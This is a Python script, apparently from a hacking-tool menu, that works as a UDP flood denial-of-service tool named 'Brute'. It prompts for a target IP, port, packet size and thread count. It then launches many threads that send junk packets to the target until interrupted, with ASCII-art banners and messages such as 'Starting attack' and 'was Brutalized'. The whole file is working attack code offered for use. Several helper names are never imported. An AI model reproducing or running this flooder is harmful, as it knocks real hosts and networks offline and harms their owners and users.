import fade
import time
from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from random import randint
from time import sleep
from getpass import getpass as hinput

class Brutalize:
    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force  
        self.threads = threads  

        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()
    
    def info(self):
        interval = 0.05
        now = time.time()

        size = 0
        self.total = 0

        bytediff = 8
        mb = 1000000
        gb = 1000000000

        while self.on:
            sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                Slow(fade.water(f"{round(size)} Mb/s - Total: {round(self.total, 1)} Gb. {' '*20}"))

            now2 = time.time()

            if now + 1 >= now2:
                continue
            
            size = round(self.sent * bytediff / mb)
            self.sent = 0

            now += 1

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except:
                pass

    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)

ascii = r'''

▀█████████▄     ▄████████ ███    █▄      ███        ▄████████ 
  ███    ███   ███    ███ ███    ███ ▀█████████▄   ███    ███ 
  ███    ███   ███    ███ ███    ███    ▀███▀▀██   ███    █▀  
 ▄███▄▄▄██▀   ▄███▄▄▄▄██▀ ███    ███     ███   ▀  ▄███▄▄▄     
▀▀███▀▀▀██▄  ▀▀███▀▀▀▀▀   ███    ███     ███     ▀▀███▀▀▀     
  ███    ██▄ ▀███████████ ███    ███     ███       ███    █▄  
  ███    ███   ███    ███ ███    ███     ███       ███    ███ 
▄█████████▀    ███    ███ ████████▀     ▄████▀     ██████████ 
               ███    ███                                              '''

banner = r"""
       █████████████████████
    ████▀                 ▀████
  ███▀                       ▀███
 ██▀                           ▀██
█▀                               ▀█
█                                 █
█   █████                 █████   █
█  ██▓▓▓███             ███▓▓▓██  █
█  ██▓▓▓▓▓██           ██▓▓▓▓▓██  █
█  ██▓▓▓▓▓▓██         ██▓▓▓▓▓▓██  █
█▄  ████▓▓▓▓██       ██▓▓▓▓████  ▄█
▀█▄   ▀███▓▓▓██     ██▓▓▓███▀   ▄█▀
  █▄    ▀█████▀     ▀█████▀    ▄█
  ██           ▄█ █▄           ██
  ██           ██ ██           ██
  ██                           ██
  ▀██  ██▀██  █  █  █  ██▀██  ██▀
   ▀████▀ ██  █  █  █  ██ ▀████▀
          ██  █  █  █  ██  
          ██  █  █  █  ██
          ██  █  █  █  ██
           █▄▄█▄▄█▄▄█▄▄█""".replace('▓', '▀')

banner = fade.water(Add.Add(ascii, banner, center=True))

def Slow(texte):
    delay = 0.03
    lignes = texte.split('\n')
    for ligne in lignes:
        print(ligne)
        time.sleep(delay)

def init():
    System.Size(140, 40)
    System.Title(".B.r.u.t.e. .-. .b.y. .b.i.l.l.y.t.h.e.g.o.a.t.3.5.6.".replace('.',''))
    Cursor.HideCursor()

init()

def stage(text, symbol = '...'):
    col1 = fade.water
    col2 = fade.water
    return f" {Col.Symbol(symbol, col2, col1, '{', '}')} {col2}{text}"

def error(text, start='\n'):
    hinput(f"{start} {Col.Symbol('!', fade.water, fade.water)} {fade.water}{text}")
    exit()

def main():
    print()
    Slow(fade.water(Colorate.Diagonal(Col.DynamicMIX((Col.white, fade.water)), Center.XCenter(banner))))

    ip = input(stage(f"Enter the IP to Brutalize {fade.water}->{fade.water} ", '?'))
    print()

    try:
        if ip.count('.') != 3:
            int('error')
        int(ip.replace('.',''))
    except:
        error("Error! Please enter a correct IP address.")

    port = input(stage(f"Enter port {fade.water}[{fade.water}press {fade.water}enter{fade.water} to attack all ports{fade.water}] {fade.water}->{fade.water} ", '?'))
    print()

    if port == '':
        port = None 
    else:
        try:
            port = int(port)
            if port not in range(1, 65535 + 1):
                int('error')
        except ValueError:
            error("Error! Please enter a correct port.")

    force = input(stage(f"Bytes per packet {fade.water}[{fade.water}press {fade.water}enter{fade.water} for 1250{fade.water}] {fade.water}->{fade.water} ", '?'))
    print()

    if force == '':
        force = 1250
    else:
        try:
            force = int(force)
        except ValueError:
            error("Error! Please enter an integer.")

    threads = input(stage(f"Threads {fade.water}[{fade.water}press {fade.water}enter{fade.water} for 100{fade.water}] {fade.water}->{fade.water} ", '?'))
    print()

    if threads == '':
        threads = 100
    else:
        try:
            threads = int(threads)
        except ValueError:
            error("Error! Please enter an integer.")

    print()
    cport = '' if port is None else f'{fade.water}:{fade.water}{port}'
    Slow(fade.water(stage(f"Starting attack on {fade.water}{ip}{cport}{fade.water}.")))

    brute = Brutalize(ip, port, force, threads)
    try:
        brute.flood()
    except:
        brute.stop()
        error("A fatal error has occured and the attack was stopped.", '')
    try:
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        brute.stop()
        Slow(fade.water(stage(f"Attack stopped. {fade.water}{ip}{cport}{fade.water} was Brutalized with {fade.water}{round(brute.total, 1)} {fade.water}Gb.", '.')))
    print('\n')
    sleep(1)

    hinput(fade.water(stage(f"Press {fade.water}enter{fade.water} to {fade.water}exit{fade.water}.", '.')))

if __name__ == '__main__':
    main()

    import os    
    input("[x] Appuyer sur entrée pour retourner au menu principal.")
    os.system('python ../../main.py')
